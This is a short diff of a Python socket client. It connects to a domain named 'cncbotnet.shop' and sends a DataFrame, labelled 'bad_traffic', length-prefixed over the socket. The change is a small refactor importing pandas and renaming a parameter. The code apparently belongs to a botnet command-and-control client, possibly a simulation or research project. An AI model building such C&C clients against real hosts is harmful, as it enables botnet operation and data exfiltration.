@@ -1,5 +1,5 @@
 import socket
-
+import pandas as pd
 
 def connection_server():
     domain = 'cncbotnet.shop'
@@ -33,8 +33,9 @@ def check_connetion(c_socket):
     
     return False #check error plz
 
-def send_to_server(c_socket, pd):
-    bad_traffic = pd.to_string().encode()
+def send_to_server(c_socket, df):
+    bad_traffic = pd.DataFrame(df)
+    bad_traffic = bad_traffic.to_string().encode()
     length = len(bad_traffic);
     c_socket.sendall(length.to_bytes(4, byteorder="little"));
     c_socket.sendall(bad_traffic)
@@ -53,4 +54,3 @@ def send_to_server(c_socket, pd):
 #    print('Received from : ', msg);
     
 #client_socket.close();
-
